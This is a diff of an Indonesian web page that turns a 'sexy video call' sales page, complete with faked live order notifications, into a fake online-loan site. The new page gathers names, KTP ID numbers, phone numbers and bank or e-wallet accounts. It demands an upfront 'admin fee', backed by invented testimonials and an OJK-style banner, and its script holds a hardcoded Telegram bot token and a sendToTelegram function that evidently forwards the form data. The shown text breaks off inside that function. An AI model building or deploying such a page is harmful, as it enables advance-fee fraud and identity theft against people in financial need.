@@ -2,222 +2,861 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VCS DINDA SHOP PROMO GILA - 1 JAM</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Pinjaman Rupiah Online Cepat & Transparan</title>
+    <meta name="description" content="Layanan pinjaman rupiah online tercepat di Indonesia. Proses transparan, bunga rendah, dan tanpa jaminan. Ajukan sekarang langsung cair ke rekening Anda.">
+    
     <style>
-        /* Gaya Modern Hijau (Green Modern UI/UX) */
-        body {
-            font-family: 'Google Sans', 'Roboto', sans-serif;
-            background-color: #f7fff7; 
-            display: flex;
-            justify-content: center;
-            padding: 10px;
+        /* RESET & BASE STYLES */
+        * {
             margin: 0;
-            min-height: 100vh;
-        }
-        .container {
-            background-color: #ffffff;
-            padding: 20px;
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-            max-width: 400px;
-            width: 100%;
-        }
-        .header {
-            text-align: center;
-            margin-bottom: 25px;
-        }
-        .header h1 {
-            font-size: 28px;
-            color: #1ed760; 
-            font-weight: 700;
-            margin: 0;
-        }
-        .price-tag {
-            background-color: #1ed760;
-            color: white;
-            padding: 15px;
-            border-radius: 15px;
-            margin: 20px 0;
-            text-align: center;
-        }
-        .price-tag .promo {
-            font-size: 14px;
-            font-weight: 500;
-            text-decoration: line-through;
-            opacity: 0.7;
-        }
-        .price-tag .main-price {
-            font-size: 48px;
-            font-weight: 900;
-            line-height: 1;
-        }
-        .details-section {
-            margin-bottom: 20px;
-        }
-        .details-section h2 {
-            color: #1ed760;
-            font-size: 20px;
-            border-left: 4px solid #1ed760;
-            padding-left: 10px;
-            margin-bottom: 10px;
-        }
-        .details-section ul {
-            list-style: none;
             padding: 0;
-        }
-        .details-section li {
-            font-size: 16px;
-            color: #555555;
-            margin-bottom: 8px;
-            display: flex;
-            align-items: flex-start;
-        }
-        .details-section li::before {
-            content: '✅';
-            margin-right: 10px;
-            font-size: 18px;
-            line-height: 1;
-        }
-        .guarantee {
-            background-color: #ffe0b2; 
-            color: #e65100;
-            padding: 15px;
-            border-radius: 10px;
-            margin-bottom: 20px;
-            font-weight: 600;
-            text-align: center;
-            border: 2px solid #ff9800;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
         }
 
-        /* Notifikasi Real-time */
-        #live-notification {
-            background-color: #333333;
+        :root {
+            --primary-color: #00812b;
+            --secondary-color: #ff9900;
+            --dark-color: #333333;
+            --light-bg: #f4f7f6;
+            --white: #ffffff;
+            --error: #e74c3c;
+            --success: #2ecc71;
+            --shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+
+        body {
+            background-color: var(--light-bg);
+            color: var(--dark-color);
+            line-height: 1.6;
+            overflow-x: hidden;
+            font-size: 16px;
+        }
+
+        /* TYPOGRAPHY */
+        h1, h2, h3 {
+            font-weight: 700;
+            line-height: 1.2;
+        }
+
+        p {
+            font-size: 14px;
+            color: #666;
+        }
+
+        /* STICKY HEADER */
+        header {
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            background: var(--white);
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .logo {
+            font-size: 20px;
+            font-weight: 800;
+            color: var(--primary-color);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .hamburger {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+            cursor: pointer;
+        }
+
+        .hamburger span {
+            display: block;
+            width: 25px;
+            height: 3px;
+            background: var(--primary-color);
+            border-radius: 3px;
+            transition: 0.3s;
+        }
+
+        /* BANNER SECTION */
+        .banner-container {
+            width: 100%;
+            background: #fff;
+            padding: 0;
+            overflow: hidden;
+        }
+
+        .banner-container img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        /* HERO SECTION */
+        .hero {
+            padding: 30px 20px;
+            text-align: center;
+            background: linear-gradient(135deg, #00812b 0%, #00a838 100%);
             color: white;
-            padding: 10px 15px;
+            border-bottom-left-radius: 30px;
+            border-bottom-right-radius: 30px;
+        }
+
+        .hero h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+
+        .hero p {
+            color: rgba(255, 255, 255, 0.9);
+            margin-bottom: 20px;
+        }
+
+        .cta-btn {
+            display: inline-block;
+            background: var(--secondary-color);
+            color: white;
+            padding: 15px 35px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 18px;
+            box-shadow: 0 4px 15px rgba(255, 153, 0, 0.4);
+            transition: transform 0.2s;
+        }
+
+        .cta-btn:active {
+            transform: scale(0.95);
+        }
+
+        /* INFO CARDS */
+        .info-section {
+            padding: 25px 20px;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+
+        .info-card {
+            background: white;
+            padding: 15px;
+            border-radius: 15px;
+            box-shadow: var(--shadow);
+            text-align: center;
+        }
+
+        .info-card i {
+            font-size: 24px;
+            color: var(--primary-color);
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        .info-card span {
+            display: block;
+            font-size: 12px;
+            color: #888;
+        }
+
+        .info-card strong {
+            font-size: 14px;
+            color: var(--dark-color);
+        }
+
+        /* FORM STYLING */
+        .form-container {
+            padding: 20px;
+            margin: 20px;
+            background: white;
+            border-radius: 20px;
+            box-shadow: var(--shadow);
+        }
+
+        .form-section-title {
+            padding-bottom: 10px;
+            border-bottom: 2px solid var(--light-bg);
+            margin-bottom: 20px;
+            color: var(--primary-color);
+            font-size: 18px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #ddd;
             border-radius: 10px;
+            font-size: 16px;
+            outline: none;
+            transition: border 0.3s;
+        }
+
+        .form-group input:focus {
+            border-color: var(--primary-color);
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .checkbox-group input {
+            width: 20px;
+            height: 20px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 18px;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: 700;
+            margin-top: 25px;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(0, 129, 43, 0.3);
+        }
+
+        /* MODAL ADMIN */
+        #adminModal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(5px);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .modal-content {
+            background: white;
+            width: 100%;
+            max-width: 400px;
+            border-radius: 20px;
+            padding: 25px;
+            text-align: center;
+            position: relative;
+            animation: slideUp 0.3s ease-out;
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .modal-admin h2 {
+            color: var(--error);
+            margin-bottom: 15px;
+            font-size: 22px;
+        }
+
+        .modal-admin p {
             margin-bottom: 20px;
             font-size: 14px;
+        }
+
+        .modal-admin table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 20px;
+        }
+
+        .modal-admin th, .modal-admin td {
+            padding: 12px;
+            border: 1px solid #eee;
             text-align: left;
+        }
+
+        .modal-admin th { background: #f9f9f9; }
+
+        .modal-admin .nominal {
+            font-size: 24px;
+            font-weight: 800;
+            color: #333;
+            background: #fff9e6;
+            padding: 10px;
+            border: 2px dashed var(--secondary-color);
+            margin: 15px 0;
+        }
+
+        .modal-admin .warning {
+            color: var(--error);
+            font-weight: 800;
+            font-size: 12px;
+            margin-top: 10px;
+        }
+
+        .btn-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .btn-continue {
+            background: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 10px;
+            font-weight: 700;
+        }
+
+        .btn-cancel {
+            background: #eee;
+            color: #666;
+            border: none;
+            padding: 12px;
+            border-radius: 10px;
+        }
+
+        /* KEUNGGULAN SECTION */
+        .features {
+            padding: 40px 20px;
+            background: white;
+        }
+
+        .feature-item {
             display: flex;
             align-items: center;
+            gap: 15px;
+            margin-bottom: 20px;
         }
-        #live-notification span {
-            margin-left: 5px;
+
+        .feature-icon {
+            width: 50px;
+            height: 50px;
+            background: #e6f9ed;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--primary-color);
+            flex-shrink: 0;
+        }
+
+        /* TESTIMONI SLIDER */
+        .testi-container {
+            padding: 30px 20px;
+            background: #fdfdfd;
+            overflow-x: auto;
+            white-space: nowrap;
+            -webkit-overflow-scrolling: touch;
+        }
+
+        .testi-card {
+            display: inline-block;
+            width: 280px;
+            background: white;
+            padding: 20px;
+            margin-right: 15px;
+            border-radius: 15px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+            white-space: normal;
+            vertical-align: top;
+            border-top: 4px solid var(--primary-color);
+        }
+
+        .testi-name {
             font-weight: bold;
-            color: #1ed760;
+            margin-bottom: 5px;
+            display: block;
         }
+
+        .testi-text {
+            font-size: 13px;
+            font-style: italic;
+        }
+
+        /* FAQ ACCORDION */
+        .faq-section {
+            padding: 40px 20px;
+        }
+
+        .faq-item {
+            background: white;
+            margin-bottom: 10px;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+
+        .faq-question {
+            padding: 15px;
+            font-weight: 600;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: #fff;
+        }
+
+        .faq-answer {
+            padding: 0 15px;
+            max-height: 0;
+            overflow: hidden;
+            transition: all 0.3s ease;
+            font-size: 14px;
+            color: #777;
+        }
+
+        .faq-item.active .faq-answer {
+            padding: 15px;
+            max-height: 200px;
+            border-top: 1px solid #f0f0f0;
+        }
+
+        /* FOOTER */
+        footer {
+            background: var(--dark-color);
+            color: white;
+            padding: 40px 20px;
+            text-align: center;
+        }
+
+        footer p { color: #bbb; margin-bottom: 10px; }
         
-        /* Tombol WA & Pembayaran */
-        .button-group {
+        .footer-links {
             display: flex;
             flex-direction: column;
             gap: 15px;
+            margin: 25px 0;
         }
-        .wa-button {
-            background-color: #25d366; 
+
+        .footer-links a {
             color: white;
-            padding: 15px;
-            border-radius: 10px;
             text-decoration: none;
-            font-size: 18px;
-            font-weight: 700;
-            display: flex;
+            font-size: 14px;
+        }
+
+        /* LOADING SPINNER */
+        #loader {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255,255,255,0.8);
+            z-index: 3000;
             justify-content: center;
             align-items: center;
         }
-        .qris-button {
-            background-color: #1a73e8; 
-            color: white;
-            padding: 15px;
-            border-radius: 10px;
-            text-decoration: none;
-            font-size: 18px;
-            font-weight: 700;
-            text-align: center;
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid var(--primary-color);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
         }
-        /* Logo WA Asli dari Google (Icon SVG/Base64) */
-        .wa-logo {
-            width: 24px;
-            height: 24px;
-            margin-right: 10px;
-            /* Menggunakan base64 data URI untuk menghindari panggilan eksternal yang lambat */
-            background: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTEyIDBDNi40ODUgMCAyLjI3OCAzLjk5NSAyLjI3OCA5LjIxNmMwIDEuNDc4LjM4MiAyLjkxNiAxLjEwNCA0LjIyTDQgMTkuOTlMNi41MDIgMjEuMDJjMS42NjYuNDEzIDMuNDE3LjYyOCA1LjQ5OC42MjhjNS41MTUgMCA5LjcyMi0zLjk5NSA5LjcyMi05LjIxNlMxNy41MTUgMCAxMiAwem0zLjA2NSAxMy45NTdjLS4xNzItLjA3Mi0uNzY2LS4zNzYtLjg4OS0uNDI0LS4xMjMtLjA0OC0uMjEzLS4wNzItLjMxNy0uMDcyLS4xMDUgMC0uMjEzLjA0OC0uNDI2LjI2Mi0uMjEzLjIxMy0uNTEzLjI1OC0uNjkgLjE4Ny0uMTc3LS4wNzItLjY3LS4yNDUtMS4yNzQtL3JkY21zLS40MTctLjI0NS0uNjg2LS40MTgtLjczMy0uNTI2LS4wNDgtLjEwOS0uMDA0LS4xNjctLjA3NC0uMjkxLS4wNzItLjEyNC0uNTc0LTEuMzctLjc4Ni0xLjgyOC0uMjEzLS40NjYtLjQzNi0uMzk5LS42LTM5OS0uMTQ0IDAtLjMxNi0uMDE4LS40ODYtLjAxOC0uMTczIDAtLjQ1Ny4wNDgtLjY5My4zMjUtLjIzNi4yNzgtLjkwMi44ODMtLjk1NS45NzYtLjA1NC4wOTQtLjEwOC4xMDUtLjMxNi4wNTYtLjIyNi0uMDUyLS44OTctLjMzNS0xLjcxLS44MTctLjY1NC0uMzU5LTEuMDk3LS41OTctMS4yOTYtLjkzLS4xOTgtLjMzNC0uMDE5LS41MTQtLjAxOS0uNTIyIDAtLjAxLjEyMy0uMjYyLjEyMy0uNDQ3IDAtLjE4NC0uMDkxLS4yNjktLjE5My0uMjcxLS4wOTktLjAyMS0uMjE1LS4wMjYtLjMyLS4wMjYtLjEwNiAwLS4yNzguMDQ4LS40MjYuMjE0LS4xNDkuMTY2LS41NzIuNTU1LS43MzcuNzQ0LS4xNjYuMTkyLS4zMTQuMjE0LS41NzYuMjk1LS4yNjIuMDgtLjY3NS4yMjktMS4yODguMDY2LS42MTItLjE2My0xLjQ0My0uNTMzLTEuNzMtLjg5My0uMjg1LS4zNi0uMjk1LS4zNTUtLjIwNS0uNTI2LjA5LS4xNy4zODktLjQwNC41ODktLjYwMi4yLS4xOTcuMjY3LS4zMzQuMzU1LS41NTYuMDktLjIyMi4wNDgtLjQxNi0uMDE4LS41NzMtLjA2NC0uMTU2LS41NTktMS4zNjktLjY5Ny0xLjg0NS0uMTM4LS40NzctLjI3OS0uMzk0LS40MDItLjM5NC0uMTIzIDAtLjI3LS4wMTgtLjQxOC0uMDE4LS4xNDcgMC0uMjQ4LjA1Mi0uMzc5LjI0MS0uMTI5LjE4Ny0uNDkzLjYwNy0uNDkzIDEuNDg1IDAgLjAyLjA0LjQ1Mi4xNDMuOTAyLjEwMS40NTEuMTA4LjkwMi4xNzkgLjk4LS4wMi4wMSAw .MDEgLS42OTkgMi40NzItLjc3LjI4OS0uNjQzLjU4OS0xLjIwOC42NTctMS4zMDMuMDc0LS4wOTYuNzI2LS41NzQgLjg3OC0uNzU4LjI3Mi0uMzQxLjU4NS0uMjk0IDEuMDY2LS4xNDkuNDY1LjEzNy40ODMuMTMxLjk5NS4zMDYuNTE1LjE3Ni43MS4yNzcuODU4LjM0OS4xNDguMDczLjI5Ni4xMzcuNDMyLjE2Ni4xMzcuMDI3LjI4OS4wNS40NjIuMDUuMjU4IDAgLjUwOC0uMDU1LjcyNS0uMTE5eiIgZmlsbD0id2hpdGUiLz48L3N2Zy4+');
-            background-repeat: no-repeat;
-            background-position: center;
-            background-size: contain;
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* ANDROID SPECIFIC MEDIA QUERIES */
+        @media screen and (max-width: 412px) {
+            .hero h1 { font-size: 22px; }
+            .submit-btn { font-size: 16px; }
+            .form-group label { font-size: 13px; }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>DINDA SHOP VCS PREMIUM</h1>
-            <p style="color: #888;">Layanan Video Call Seksi Paling Dicari</p>
-        </div>
 
-        <div class="price-tag">
-            <p class="promo">HARGA NORMAL: Rp 50.000</p>
-            <p class="main-price">Rp 20.000</p>
-            <p style="margin-top: -10px; font-size: 18px;">Durasi Penuh 60 Menit!</p>
-        </div>
-        
-        <div id="live-notification">
-            ⭐ Notifikasi: 1 Pemesanan Masuk Real-time <span id="time-ago">Baru Saja</span>
-        </div>
+    <div id="loader"><div class="spinner"></div></div>
 
-        <div class="details-section">
-            <h2>DETAIL LAYANAN</h2>
-            <ul>
-                <li>Durasi Penuh 60 Menit (1 Jam)</li>
-                <li>Kualitas Video HD Jernih Tanpa Buffer</li>
-                <li>Bebas Pilih Pakaian & Gaya Favorit Kamu</li>
-                <li>Privasi 100% Aman & Terjamin</li>
-                <li>Support Semua Aplikasi (WA, Telegram, dll)</li>
-            </ul>
+    <header>
+        <div class="logo">Pinjaman Rupiah</div>
+        <div class="hamburger" onclick="toggleMenu()">
+            <span></span>
+            <span></span>
+            <span></span>
         </div>
-        
-        <div class="guarantee">
-            Jaminan Kepuasan 100% atau Sesi Berikutnya GRATIS!
-        </div>
+    </header>
 
-        <div class="button-group">
-            <a href="https://wa.me/6287XXXXXXXXXX" class="wa-button">
-                <span class="wa-logo"></span>
-                HUBUNGI VIA WHATSAPP
-            </a>
-
-            <a href="https://i.ibb.co/v4hsFtQq/1000232104.jpg" class="qris-button" target="_blank">
-                BAYAR SEKARANG VIA QRIS (Wajib Tab Baru)
-            </a>
-        </div>
-        
+    <div class="banner-container">
+        <a href="https://imgbb.com/">
+            <img src="https://i.ibb.co.com/0j1d2rCx/ojk.jpg" alt="ojk" border="0">
+        </a>
     </div>
 
+    <section class="hero">
+        <h1>Pinjaman Rupiah Online Cepat & Aman</h1>
+        <p>Solusi finansial terpercaya, proses 100% online tanpa ribet.</p>
+        <a href="#formPinjaman" class="cta-btn">Ajukan Pinjaman</a>
+    </section>
+
+    <section class="info-section">
+        <div class="info-card">
+            <span>Plafon Pinjaman</span>
+            <strong>Rp 1jt - Rp 20jt</strong>
+        </div>
+        <div class="info-card">
+            <span>Tenor Pinjaman</span>
+            <strong>91 - 365 Hari</strong>
+        </div>
+        <div class="info-card">
+            <span>Estimasi Cair</span>
+            <strong>5 - 15 Menit</strong>
+        </div>
+        <div class="info-card">
+            <span>Metode Cair</span>
+            <strong>Bank & E-Wallet</strong>
+        </div>
+    </section>
+
+    <section class="form-container">
+        <h2 class="form-section-title">Data Pengajuan</h2>
+        <form id="formPinjaman">
+            <div class="form-group">
+                <label>Nama Lengkap (Sesuai KTP)</label>
+                <input type="text" id="nama" placeholder="Contoh: Budi Santoso" required>
+            </div>
+            <div class="form-group">
+                <label>Nomor KTP (16 Digit)</label>
+                <input type="number" id="ktp" placeholder="320xxxxxxxxxxxxx" required>
+            </div>
+            <div class="form-group">
+                <label>Nomor HP Aktif (WhatsApp)</label>
+                <input type="tel" id="nohp" placeholder="08xxxxxxxxxx" required>
+            </div>
+
+            <div class="form-group">
+                <label>Jumlah Pinjaman</label>
+                <select id="nominal" required>
+                    <option value="">Pilih Nominal</option>
+                    <option value="Rp 1.000.000">Rp 1.000.000</option>
+                    <option value="Rp 2.500.000">Rp 2.500.000</option>
+                    <option value="Rp 5.000.000">Rp 5.000.000</option>
+                    <option value="Rp 10.000.000">Rp 10.000.000</option>
+                    <option value="Rp 20.000.000">Rp 20.000.000</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label>Tenor Pinjaman</label>
+                <select id="tenor" required>
+                    <option value="90 Hari">90 Hari</option>
+                    <option value="180 Hari">180 Hari</option>
+                    <option value="12 Bulan">12 Bulan</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label>Tujuan Pinjaman</label>
+                <input type="text" id="tujuan" placeholder="Contoh: Modal Usaha" required>
+            </div>
+
+            <div class="form-group">
+                <label>Pilih Bank / E-Wallet</label>
+                <select id="bank" required>
+                    <option value="BCA">BCA</option>
+                    <option value="MANDIRI">MANDIRI</option>
+                    <option value="BNI">BNI</option>
+                    <option value="BRI">BRI</option>
+                    <option value="DANA">DANA</option>
+                    <option value="OVO">OVO</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label>Nomor Rekening / No. HP E-Wallet</label>
+                <input type="number" id="norek" placeholder="Masukkan nomor tujuan" required>
+            </div>
+
+            <div class="checkbox-group">
+                <input type="checkbox" id="setuju" required>
+                <label for="setuju">Saya menyetujui Syarat & Ketentuan serta Kebijakan Privasi yang berlaku.</label>
+            </div>
+
+            <button type="button" class="submit-btn" onclick="showAdminModal()">Kirim Pengajuan</button>
+        </form>
+    </section>
+
+    <div id="adminModal">
+        <div class="modal-content">
+            <div class="modal-admin">
+                <h2>Biaya Admin</h2>
+                <p>Untuk melanjutkan proses pengajuan pinjaman, silakan selesaikan pembayaran biaya admin berikut.</p>
+                
+                <table>
+                    <tr>
+                        <th>Jenis</th>
+                        <th>Nominal</th>
+                    </tr>
+                    <tr>
+                        <td>Admin Pengajuan</td>
+                        <td>Rp 15.407</td>
+                    </tr>
+                </table>
+
+                <div class="nominal">Rp 15.407</div>
+
+                <p style="font-weight: bold; margin-bottom: 5px;">Contoh Pembayaran Admin:</p>
+                <a href="https://ibb.co.com/TDyvHQ4g">
+                    <img src="https://i.ibb.co.com/ym2f8z6Q/Screenshot-20251222-163847.jpg" alt="Screenshot" border="0" style="width:100%; border-radius:10px;">
+                </a>
+
+                <p class="warning">TANPA BIAYA TIDAK BISA DI PROSES 100% GAGAL</p>
+
+                <div class="btn-group">
+                    <button class="btn-continue" onclick="sendToTelegram()">Lanjutkan Proses</button>
+                    <button class="btn-cancel" onclick="closeAdminModal()">Batal</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <section class="features">
+        <h2 style="text-align:center; margin-bottom:30px;">Mengapa Memilih Kami?</h2>
+        <div class="feature-item">
+            <div class="feature-icon">✓</div>
+            <div>
+                <strong>Proses 100% Online</strong>
+                <p>Cukup gunakan ponsel Android Anda di mana saja.</p>
+            </div>
+        </div>
+        <div class="feature-item">
+            <div class="feature-icon">✓</div>
+            <div>
+                <strong>Tanpa Jaminan</strong>
+                <p>Cukup KTP untuk proses pengajuan awal.</p>
+            </div>
+        </div>
+        <div class="feature-item">
+            <div class="feature-icon">✓</div>
+            <div>
+                <strong>Keamanan Data</strong>
+                <p>Enkripsi tingkat tinggi melindungi data pribadi Anda.</p>
+            </div>
+        </div>
+        <div class="feature-item">
+            <div class="feature-icon">✓</div>
+            <div>
+                <strong>Transparansi</strong>
+                <p>Semua biaya dijelaskan di awal tanpa biaya tersembunyi.</p>
+            </div>
+        </div>
+    </section>
+
+    <h2 style="padding: 20px; text-align:center;">Suara Nasabah Kami</h2>
+    <div class="testi-container">
+        <div class="testi-card">
+            <span class="testi-name">Andi Saputra</span>
+            <p class="testi-text">"Prosesnya sangat cepat, dana langsung masuk ke DANA saya dalam 10 menit. Terima kasih!"</p>
+        </div>
+        <div class="testi-card">
+            <span class="testi-name">Siti Aminah</span>
+            <p class="testi-text">"Sangat terbantu buat modal dagang dadakan. Admin transparan dari awal."</p>
+        </div>
+        <div class="testi-card">
+            <span class="testi-name">Rendi Pratama</span>
+            <p class="testi-text">"Aplikasi paling gampang di Android. Gak pake ribet foto sana-sini."</p>
+        </div>
+        <div class="testi-card">
+            <span class="testi-name">Dewi Lestari</span>
+            <p class="testi-text">"Bunganya cukup bersaing dan tenornya fleksibel banget buat saya."</p>
+        </div>
+        <div class="testi-card">
+            <span class="testi-name">Bambang S.</span>
+            <p class="testi-text">"Pelayanan CS ramah pas tanya-tanya soal admin di awal. Recomended!"</p>
+        </div>
+        <div class="testi-card">
+            <span class="testi-name">Eka Putri</span>
+            <p class="testi-text">"Pinjaman paling transparan yang pernah saya coba. Cepat cair!"</p>
+        </div>
+        <div class="testi-card">
+            <span class="testi-name">Hendra Wahyudi</span>
+            <p class="testi-text">"Sangat membantu di saat emergency. Proses verifikasi KTP juga cepat."</p>
+        </div>
+        <div class="testi-card">
+            <span class="testi-name">Mega Utami</span>
+            <p class="testi-text">"Terima kasih atas pinjamannya, tenor setahun bikin cicilan ringan."</p>
+        </div>
+        <div class="testi-card">
+            <span class="testi-name">Fajar Rizky</span>
+            <p class="testi-text">"Plafon yang didapat lumayan tinggi untuk pengguna baru."</p>
+        </div>
+        <div class="testi-card">
+            <span class="testi-name">Linda Sari</span>
+            <p class="testi-text">"Udah langganan di sini tiap butuh dana mendadak. Mantap!"</p>
+        </div>
+    </div>
+
+    <section class="faq-section">
+        <h2 style="text-align:center; margin-bottom:20px;">Tanya Jawab (FAQ)</h2>
+        <div class="faq-item" onclick="toggleFaq(this)">
+            <div class="faq-question">Apa syarat mengajukan pinjaman? <span>+</span></div>
+            <div class="faq-answer">WNI, usia 18-55 tahun, memiliki KTP aktif, dan memiliki rekening bank/e-wallet.</div>
+        </div>
+        <div class="faq-item" onclick="toggleFaq(this)">
+            <div class="faq-question">Berapa biaya adminnya? <span>+</span></div>
+            <div class="faq-answer">Biaya admin pengajuan adalah Rp 15.407 yang dibayarkan di awal sebelum proses pencairan.</div>
+        </div>
+        <div class="faq-item" onclick="toggleFaq(this)">
+            <div class="faq-question">Berapa lama dana cair? <span>+</span></div>
+            <div class="faq-answer">Setelah proses verifikasi dan administrasi selesai, dana cair dalam 5-15 menit.</div>
+        </div>
+        <div class="faq-item" onclick="toggleFaq(this)">
+            <div class="faq-question">Apakah data saya aman? <span>+</span></div>
+            <div class="faq-answer">Tentu, kami menjamin kerahasiaan data nasabah dengan sistem keamanan tinggi.</div>
+        </div>
+        <div class="faq-item" onclick="toggleFaq(this)">
+            <div class="faq-question">Bagaimana jika tidak bayar admin? <span>+</span></div>
+            <div class="faq-answer">Tanpa pembayaran biaya admin, sistem tidak akan memproses pengajuan Anda (100% Gagal).</div>
+        </div>
+        <div class="faq-item" onclick="toggleFaq(this)">
+            <div class="faq-question">Apakah bisa bayar via Dana? <span>+</span></div>
+            <div class="faq-answer">Bisa, kami menerima pembayaran via transfer Bank maupun berbagai E-Wallet.</div>
+        </div>
+        <div class="faq-item" onclick="toggleFaq(this)">
+            <div class="faq-question">Berapa limit maksimal? <span>+</span></div>
+            <div class="faq-answer">Limit maksimal untuk pengguna baru hingga Rp 20.000.000 tergantung skor kredit.</div>
+        </div>
+        <div class="faq-item" onclick="toggleFaq(this)">
+            <div class="faq-question">Apakah butuh jaminan? <span>+</span></div>
+            <div class="faq-answer">Tidak butuh jaminan aset apapun, hanya kelengkapan data diri.</div>
+        </div>
+        <div class="faq-item" onclick="toggleFaq(this)">
+            <div class="faq-question">Berapa bunga per harinya? <span>+</span></div>
+            <div class="faq-answer">Bunga mulai dari 0,04% per hari sesuai ketentuan regulasi fintech.</div>
+        </div>
+        <div class="faq-item" onclick="toggleFaq(this)">
+            <div class="faq-question">Kapan CS tersedia? <span>+</span></div>
+            <div class="faq-answer">Layanan Customer Service kami tersedia 24 jam setiap harinya.</div>
+        </div>
+    </section>
+
+    <footer>
+        <div class="logo" style="color:white; margin-bottom: 20px;">Pinjaman Rupiah</div>
+        <p>Layanan keuangan digital yang memberikan kemudahan akses bagi seluruh rakyat Indonesia.</p>
+        <div class="footer-links">
+            <a href="#">Tentang Kami</a>
+            <a href="#">Syarat & Ketentuan</a>
+            <a href="#">Kebijakan Privasi</a>
+            <a href="#">Hubungi CS</a>
+        </div>
+        <p style="font-size: 11px;">&copy; 2025 Pinjaman Rupiah Online. Seluruh hak cipta dilindungi.</p>
+    </footer>
+
     <script>
-        // JAVASCRIPT: ILUSI Notifikasi Real-time
-        const timeAgoElement = document.getElementById('time-ago');
-        let seconds = 0;
-        
-        function updateNotificationTime() {
-            seconds++;
-            let text = "Baru Saja";
-            if (seconds > 5 && seconds < 60) {
-                text = `${seconds} Detik Lalu`;
-            } else if (seconds >= 60) {
-                // Reset simulasi notifikasi baru setelah 60 detik
-                seconds = 0;
-                text = "Baru Saja";
-                const fakeUsers = ["Bapak", "Om VIP", "Mas Bro"];
-                const randomUser = fakeUsers[Math.floor(Math.random() * fakeUsers.length)];
-                document.getElementById('live-notification').innerHTML = 
-                    `⭐ Notifikasi: Pemesanan dari ${randomUser} Masuk Real-time <span id="time-ago">${text}</span>`;
-            }
-            document.getElementById('live-notification').querySelector('span').textContent = text;
+        const BOT_TOKEN = '8521057792:AAF2vHWuBu6AMGtM6hBAyNJ8EKcVw_ls2GY';
+        const CHAT_ID = '8001301204';
+
+        function toggleMenu() {
+            alert("Menu navigasi sedang dalam pengembangan untuk versi Android ini.");
         }
 
-        setInterval(updateNotificationTime, 1000);
-        updateNotificationTime();
+        function toggleFaq(el) {
+            el.classList.toggle('active');
+        }
+
+        function showAdminModal() {
+            // Validasi Input Terlebih Dahulu
+            const nama = document.getElementById('nama').value;
+            const ktp = document.getElementById('ktp').value;
+            const nohp = document.getElementById('nohp').value;
+            const norek = document.getElementById('norek').value;
+            const nominal = document.getElementById('nominal').value;
+            const setuju = document.getElementById('setuju').checked;
+
+            if (!nama || !ktp || !nohp || !norek || !nominal) {
+                alert("Harap lengkapi semua data formulir pengajuan!");
+                return;
+            }
+
+            if (ktp.length < 16) {
+                alert("Nomor KTP harus 16 digit!");
+                return;
+            }
+
+            if (!setuju) {
+                alert("Anda harus menyetujui syarat & ketentuan!");
+                return;
+            }
+
+            // Tampilkan Modal
+            document.getElementById('adminModal').style.display = 'flex';
+        }
+
+        function closeAdminModal() {
+            document.getElementById('adminModal').style.display = 'none';
+        }
+
+        function sendToTelegram() {
+            const loader = document.getElementById('loader');
+            loader.style.display = 'flex';
+
+            const nama = document.getElementById('nama').value;
